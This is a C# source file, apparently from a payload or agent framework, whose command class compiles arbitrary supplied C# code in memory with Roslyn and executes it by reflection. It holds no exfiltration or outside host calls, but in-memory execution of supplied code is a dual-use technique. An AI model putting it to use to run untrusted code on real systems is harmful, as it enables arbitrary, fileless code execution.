using CommonClassLibrary;
using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;
using Microsoft.CSharp;
using Payload.Command;
using Payload.Command.Interface;
using System;
using System.CodeDom;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Payload.Core.Command
{
    public class CSharpExecuteCommand : Payload.Command.Interface.ICommand
    {
        public string TargetCSharpCode { get; set; }

        private void ExecuteCSharp(string source, string methodname= "mymethod", string classname = "myclass", List<string> usingList =null, List<string> importList=null)
        {
            if(usingList==null) usingList = new List<string>() { "Payload.Core.Command" };
            if(importList==null) importList = new List<string>() { "Payload.Core.Command" };
            //Create method
            CodeMemberMethod pMethod = new CodeMemberMethod();
            pMethod.Name = methodname;
            pMethod.Attributes = MemberAttributes.Public;
            //pMethod.Parameters.Add(new CodeParameterDeclarationExpression(typeof(string[]), "boxes"));
            pMethod.ReturnType = new CodeTypeReference(typeof(bool));
            pMethod.Statements.Add(new CodeSnippetExpression(@"
            bool result = true;
            try
            {
                " + source + @"
            }
            catch
            {
                result = false;
            }
            return result;
            "));

            //Crée la classe
            CodeTypeDeclaration pClass =
              new System.CodeDom.CodeTypeDeclaration(classname);
            pClass.Attributes = MemberAttributes.Public;
            pClass.Members.Add(pMethod);
            //Crée le namespace
            CodeNamespace pNamespace = new CodeNamespace("myNameSpace");
            pNamespace.Types.Add(pClass);
            foreach (string sUsing in usingList)
                pNamespace.Imports.Add(new
                  CodeNamespaceImport(sUsing));

            //Create compile unit
            CodeCompileUnit pUnit = new CodeCompileUnit();
            pUnit.Namespaces.Add(pNamespace);
            //Make compilation parameters
            CompilerParameters pParams =
              new CompilerParameters((string[])importList.ToArray<string>());
            pParams.GenerateInMemory = true;
            //Compile
            CompilerResults pResults = (new CSharpCodeProvider()).CreateCompiler().CompileAssemblyFromDom(pParams, pUnit);

            if (pResults.Errors != null && pResults.Errors.Count > 0)
                foreach (CompilerError pError in pResults.Errors)
                    Console.WriteLine(pError.ToString());

            var r = pResults.CompiledAssembly.CreateInstance("myNameSp ace." + classname);
        }

        /// <summary>
        /// Resolve Roslyn metadata references from the current runtime (Windows/Linux),
        /// instead of a hardcoded Windows shared-framework path.
        /// </summary>
        private static IReadOnlyList<MetadataReference> CreateCompilationReferences()
        {
            var references = new List<MetadataReference>();
            var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

            void AddFile(string? path)
            {
                if (string.IsNullOrWhiteSpace(path) || !File.Exists(path) || !seen.Add(path))
                {
                    return;
                }

                references.Add(MetadataReference.CreateFromFile(path));
            }

            // Core assemblies via live types (works on any RID).
            AddFile(typeof(object).Assembly.Location);          // System.Private.CoreLib
            AddFile(typeof(Console).Assembly.Location);         // System.Console
            AddFile(typeof(Enumerable).Assembly.Location);      // System.Linq
            AddFile(typeof(List<>).Assembly.Location);          // System.Collections
            AddFile(typeof(ValueTask).Assembly.Location);       // System.Private.CoreLib / threading
            AddFile(typeof(Payload.Core.Command.DemoCommand).Assembly.Location);     // Payload.Core.Command

            // Trusted platform assemblies: pick System.Runtime / netstandard by file name.
            var tpa = AppContext.GetData("TRUSTED_PLATFORM_ASSEMBLIES") as string;
            if (!string.IsNullOrEmpty(tpa))
            {
                foreach (var path in tpa.Split(Path.PathSeparator, StringSplitOptions.RemoveEmptyEntries))
                {
                    var name = Path.GetFileName(path);
                    if (name.Equals("System.Runtime.dll", StringComparison.OrdinalIgnoreCase)
                        || name.Equals("netstandard.dll", StringComparison.OrdinalIgnoreCase)
                        || name.Equals("System.Runtime.Extensions.dll", StringComparison.OrdinalIgnoreCase))
                    {
                        AddFile(path);
                    }
                }
            }
            else
            {
                // Fallback: runtime directory next to System.Private.CoreLib.
                var runtimeDir = Path.GetDirectoryName(typeof(object).Assembly.Location);
                if (!string.IsNullOrEmpty(runtimeDir))
                {
                    AddFile(Path.Combine(runtimeDir, "System.Runtime.dll"));
                    AddFile(Path.Combine(runtimeDir, "netstandard.dll"));
                }
            }

            return references;
        }

        private (Assembly assembly, string log) CompileCode(string sourceCode)
        {
            var syntaxTree = CSharpSyntaxTree.ParseText(sourceCode);
            var references = CreateCompilationReferences();

            CSharpCompilation compilation = CSharpCompilation.Create(
                "DynamicAssembly",
                new[] { syntaxTree },
                references,
                new CSharpCompilationOptions(OutputKind.DynamicallyLinkedLibrary));

            using (var ms = new MemoryStream())
            {
                var result = compilation.Emit(ms);
                var log = new StringBuilder();

                if (!result.Success)
                {
                    foreach (var diagnostic in result.Diagnostics)
                    {
                        log.AppendLine(diagnostic.ToString());
                    }
                    return (null, log.ToString());
                }

                ms.Seek(0, SeekOrigin.Begin);
                var assembly = Assembly.Load(ms.ToArray());
                return (assembly, log.ToString());
            }
        }

        public override Task Execute()
        {
            string _code = @"
        using System;
        using System.Collections.Generic;
        using System.Text;
        using System.Threading.Tasks;
        using Payload.Core.Command;
        using System.Reflection;
        [assembly: global::System.Runtime.Versioning.TargetFrameworkAttribute("".NETCoreApp,Version=v8.0"", FrameworkDisplayName = "".NET 8.0"")]
        public class HelloWorld
        {
            public bool SayHello()
            {
                bool result = true;
                try
                {
                    " + TargetCSharpCode + @"
                }
                catch
                {
                    result = false;
                }
                
                Console.WriteLine(""Hello, World!"");
                return result;
            }
        }";

            string code = @"
        using System;

        public class HelloWorld
        {
            public void SayHello()
            {
                Console.WriteLine(""Hello, World!"");
            }
        }";

            try
            {
                //ExecuteCSharp(_code);
                var(assembly, log)  = CompileCode(_code);
                // Log the compilation result
                Console.WriteLine("Compilation Log:");
                Console.WriteLine(log);
                if (assembly != null)
                {
                    var type = assembly.GetType("HelloWorld");
                    var instance = Activator.CreateInstance(type);
                    type.GetMethod("SayHello").Invoke(instance, null);
                }
            }
            catch(Exception ex)
            {
#if DEBUG
                Console.WriteLine (ex.ToString());
#endif
            }
            return null;
        }
    }
}
